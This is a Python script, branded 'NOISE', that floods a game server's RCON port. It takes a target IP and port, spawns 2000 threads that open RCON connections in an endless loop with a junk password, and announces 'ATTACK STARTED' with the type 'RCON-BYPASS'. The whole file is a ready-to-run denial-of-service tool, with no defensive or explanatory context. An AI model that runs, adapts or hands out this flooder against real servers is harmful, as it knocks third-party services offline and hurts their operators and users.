import time
import os
import sys
import threading
from valve.rcon import RCON

ip = sys.argv[1]
port = int(sys.argv[2])
target = (ip, port)
tcount = 2000
password = "agsgqgdgwhdhehisjdi3sjehwidhhesjheb"
banner = """
███╗   ██╗ ██████╗ ██╗███████╗███████╗
████╗  ██║██╔═══██╗██║██╔════╝██╔════╝
██╔██╗ ██║██║   ██║██║███████╗█████╗
██║╚██╗██║██║   ██║██║╚════██║██╔══╝
██║ ╚████║╚██████╔╝██║███████║███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚══════╝╚══════╝

"""
print("Please Wait...")

def rconflood(target, password):
  while True:
    try:
      with RCON(target, password):
        pass
    except Exception as e:
      pass

for i in range(tcount):
  t = threading.Thread(target=rconflood,args=(target, password), daemon=True)
  t.start()

os.system("clear")
print("\033[34m" + banner)
print(" ")
print("\033[31mATTACK STARTED")
print(" ")
print(f"Target IP: {ip}")
print(f"Target Port: {port}")
print(f"Threads: {tcount}")
print("Type: RCON-BYPASS")
print(" ")
print("Use CTRL+C For Stop.")
while True:
  time.sleep(1)
